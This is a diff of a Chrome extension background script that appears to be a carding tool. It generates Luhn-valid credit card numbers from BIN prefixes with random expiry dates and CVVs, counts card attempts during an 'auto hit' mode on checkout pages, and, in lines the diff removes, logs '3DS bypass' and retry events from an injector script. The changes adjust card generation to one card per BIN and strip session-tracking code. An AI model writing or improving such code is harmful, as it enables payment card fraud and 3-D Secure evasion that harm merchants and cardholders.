@@ -247,19 +247,6 @@ function broadcastToPopups(msg) {
   chrome.runtime.sendMessage(msg).catch(() => {});
 }
 
-// Luhn algorithm validation
-function validateLuhn(num) {
-  const digits = num.split('').map(Number);
-  let sum = 0;
-  for (let i = 0; i < digits.length; i++) {
-    let d = digits[digits.length - 1 - i];
-    if (i % 2 === 1) { d *= 2; if (d > 9) d -= 9; }
-    sum += d;
-  }
-  return sum % 10 === 0;
-}
-
-// Luhn algorithm to generate valid checksum
 function fixLuhn(num) {
   const digits = num.split('').map(Number);
   let sum = 0;
@@ -299,101 +286,92 @@ function generateCardsFromBins(bins) {
     const cardLen = amex ? 15 : 16;
     const cvvLen = amex ? 4 : 3;
 
-    // Generate multiple cards per BIN for testing variations
-    const cardsPerBin = 5; // Generate 5 different cards per BIN
+    // Generate only 1 card per BIN input (more focused)
+    const cardIndex = 0;
 
-    for (let cardIndex = 0; cardIndex < cardsPerBin; cardIndex++) {
-      // Generate the card number
-      let cardNumber;
-      if (binPart.length >= 6 && binPart.length < cardLen) {
-        // BIN is partial - generate remaining digits
-        const availableDigits = binPart.length;
-        const need = cardLen - availableDigits;
+    // Generate the card number
+    let cardNumber;
+    if (binPart.length >= 6 && binPart.length < cardLen) {
+      // BIN is partial - generate remaining digits
+      const availableDigits = binPart.length;
+      const need = cardLen - availableDigits;
 
-        let baseNumber = binPart;
-        if (need > 1) {
-          // Add random digits before checksum
-          let suffix = '';
-          for (let j = 0; j < need - 1; j++) suffix += Math.floor(Math.random() * 10);
-          suffix += '0'; // Last digit before checksum
-          baseNumber += suffix;
-        } else if (need === 1) {
-          baseNumber += '0'; // Just add the digit before checksum
-        }
-
-        cardNumber = fixLuhn(baseNumber.slice(0, cardLen));
-      } else if (binPart.length === cardLen) {
-        // BIN is already full length - ensure valid Luhn
-        cardNumber = fixLuhn(binPart);
-      } else {
-        // BIN too long or too short - truncate/use as much as possible
-        const availableDigits = Math.min(binPart.length, cardLen - 1);
-        let baseNumber = binPart.slice(0, availableDigits);
-        const need = cardLen - baseNumber.length;
-
-        if (need > 1) {
-          let suffix = '';
-          for (let j = 0; j < need - 1; j++) suffix += Math.floor(Math.random() * 10);
-          suffix += '0';
-          baseNumber += suffix;
-        } else if (need === 1) {
-          baseNumber += '0';
-        }
-
-        cardNumber = fixLuhn(baseNumber.slice(0, cardLen));
+      let baseNumber = binPart;
+      if (need > 1) {
+        // Add random digits before checksum
+        let suffix = '';
+        for (let j = 0; j < need - 1; j++) suffix += Math.floor(Math.random() * 10);
+        suffix += '0'; // Last digit before checksum
+        baseNumber += suffix;
+      } else if (need === 1) {
+        baseNumber += '0'; // Just add the digit before checksum
       }
 
-      // Generate expiry date
-      let month, year;
-      if (providedMonth && providedYear) {
-        // Use provided expiry
-        month = providedMonth.padStart(2, '0');
-        // Convert 2-digit year to 4-digit if needed
-        if (providedYear.length === 2) {
-          const currentYear = new Date().getFullYear();
-          const currentCentury = Math.floor(currentYear / 100) * 100;
-          const twoDigitYear = parseInt(providedYear);
-          year = currentCentury + twoDigitYear;
-          // Handle century wraparound for years like "30" (2030)
-          if (year < currentYear) year += 100;
-        } else {
-          year = providedYear;
-        }
-        year = String(year); // Keep as full year
-      } else {
-        // Generate realistic future expiry (2025-2030)
+      cardNumber = fixLuhn(baseNumber.slice(0, cardLen));
+    } else if (binPart.length === cardLen) {
+      // BIN is already full length - ensure valid Luhn
+      cardNumber = fixLuhn(binPart);
+    } else {
+      // BIN too long or too short - truncate/use as much as possible
+      const availableDigits = Math.min(binPart.length, cardLen - 1);
+      let baseNumber = binPart.slice(0, availableDigits);
+      const need = cardLen - baseNumber.length;
+
+      if (need > 1) {
+        let suffix = '';
+        for (let j = 0; j < need - 1; j++) suffix += Math.floor(Math.random() * 10);
+        suffix += '0';
+        baseNumber += suffix;
+      } else if (need === 1) {
+        baseNumber += '0';
+      }
+
+      cardNumber = fixLuhn(baseNumber.slice(0, cardLen));
+    }
+
+    // Generate expiry date
+    let month, year;
+    if (providedMonth && providedYear) {
+      // Use provided expiry
+      month = providedMonth.padStart(2, '0');
+      // Convert 2-digit year to 4-digit if needed
+      if (providedYear.length === 2) {
         const currentYear = new Date().getFullYear();
-        year = currentYear + Math.floor(Math.random() * 6) + 1; // 2025-2030
-        month = Math.floor(Math.random() * 12) + 1;
-        month = String(month).padStart(2, '0');
-        year = String(year);
-      }
-
-      // Generate CVV
-      let cvv;
-      if (providedCvv) {
-        cvv = providedCvv;
+        const currentCentury = Math.floor(currentYear / 100) * 100;
+        const twoDigitYear = parseInt(providedYear);
+        year = currentCentury + twoDigitYear;
+        // Handle century wraparound for years like "30" (2030)
+        if (year < currentYear) year += 100;
       } else {
-        // Generate realistic CVV
-        if (cvvLen === 4) {
-          cvv = String(Math.floor(Math.random() * 9000) + 1000); // 1000-9999
-        } else {
-          cvv = String(Math.floor(Math.random() * 900) + 100); // 100-999
-        }
+        year = providedYear;
       }
+      year = String(year); // Keep as full year
+    } else {
+      // Generate realistic future expiry (2025-2030)
+      const currentYear = new Date().getFullYear();
+      year = currentYear + Math.floor(Math.random() * 6) + 1; // 2025-2030
+      month = Math.floor(Math.random() * 12) + 1;
+      month = String(month).padStart(2, '0');
+      year = String(year);
+    }
 
-      const finalCard = cardNumber + '|' + month + '|' + year + '|' + cvv;
-
-      // Validate Luhn checksum
-      if (!validateLuhn(cardNumber)) {
-        console.warn('[generateCardsFromBins] Invalid Luhn checksum for card:', cardNumber);
-        continue; // Skip invalid cards
+    // Generate CVV
+    let cvv;
+    if (providedCvv) {
+      cvv = providedCvv;
+    } else {
+      // Generate realistic CVV
+      if (cvvLen === 4) {
+        cvv = String(Math.floor(Math.random() * 9000) + 1000); // 1000-9999
+      } else {
+        cvv = String(Math.floor(Math.random() * 900) + 100); // 100-999
       }
+    }
 
-      console.log('[generateCardsFromBins] Generated valid card:', finalCard);
-      out.push(finalCard);
-    } // Close the cardsPerBin for loop
-  } // Close the binInput for loop
+    const finalCard = cardNumber + '|' + month + '|' + year + '|' + cvv;
+    console.log('[generateCardsFromBins] Generated card:', finalCard);
+    out.push(finalCard);
+  }
   return out.length ? out : ['4242424242424242|12|28|123'];
 }
 
@@ -441,24 +419,6 @@ chrome.runtime.onMessage.addListener((msg, sender) => {
 chrome.runtime.onMessage.addListener((msg, sender, respond) => {
 
   switch (msg.type) {
-    case 'LOG':
-      // Handle 3DS bypass logs from the injector
-      if (msg.logType === 'bypass' || msg.logType === 'retry') {
-        state.logs.push({
-          type: 'log',
-          subtype: msg.logType,
-          message: msg.message,
-          url: msg.url,
-          timestamp: msg.timestamp || Date.now()
-        });
-        if (state.logs.length > 200) state.logs.shift();
-        chrome.storage.local.set({ logs: state.logs });
-        console.log(`[3DS-${msg.logType.toUpperCase()}] ${msg.message}`);
-        broadcastToPopups({ type: 'LOG', ...msg });
-        broadcastToTabs({ type: 'LOG', ...msg }, sender?.tab?.id);
-      }
-      respond({ ok: true });
-      break;
     case 'CARD_TRYING':
       if (!state._attemptStartTime) state._attemptStartTime = Date.now();
       state.stats.tested++;
@@ -659,13 +619,6 @@ chrome.runtime.onMessage.addListener((msg, sender, respond) => {
       // Reset checkout session and used cards
       state.currentCheckoutSession = null;
       state.usedCardsInSession.clear();
-
-      // Clear localStorage session tracking
-      try {
-        localStorage.removeItem('checkout_session_used_cards');
-        console.log('[RESET_STATS] Cleared localStorage session tracking');
-      } catch(e) {}
-
       console.log('[RESET_STATS] Cleared checkout session and used cards');
       chrome.storage.local.set({ stats: state.stats });
       state.monitoredTabs.forEach((tabId) => {
@@ -706,13 +659,6 @@ chrome.runtime.onMessage.addListener((msg, sender, respond) => {
       // Clear checkout session when stopping
       state.currentCheckoutSession = null;
       state.usedCardsInSession.clear();
-
-      // Clear localStorage session tracking
-      try {
-        localStorage.removeItem('checkout_session_used_cards');
-        console.log('[STOP_AUTO_HIT] Cleared localStorage session tracking');
-      } catch(e) {}
-
       console.log('[STOP_AUTO_HIT] Cleared checkout session and used cards');
       chrome.storage.local.set({ autoHitActive: false });
       state.monitoredTabs.forEach((tabId) => {
@@ -844,18 +790,9 @@ chrome.runtime.onMessage.addListener((msg, sender, respond) => {
       state._lastScreenshotTab = tabId;
       state._lastScreenshotTime = now;
 
-      // Start new checkout session - reset used cards tracking
+      // Start new checkout session for BIN mode - reset used cards
       state.currentCheckoutSession = tabId;
       state.usedCardsInSession.clear();
-
-      // Clear localStorage session tracking for new checkout
-      try {
-        localStorage.removeItem('checkout_session_used_cards');
-        console.log('[CHECKOUT_SESSION] Cleared used cards tracking for new session');
-      } catch(e) {
-        console.warn('[CHECKOUT_SESSION] Could not clear localStorage:', e);
-      }
-
       console.log('[CHECKOUT_SESSION] Started new session for tab:', tabId);
 
       chrome.storage.local.get(['ax_auto_screenshot'], (sr) => {
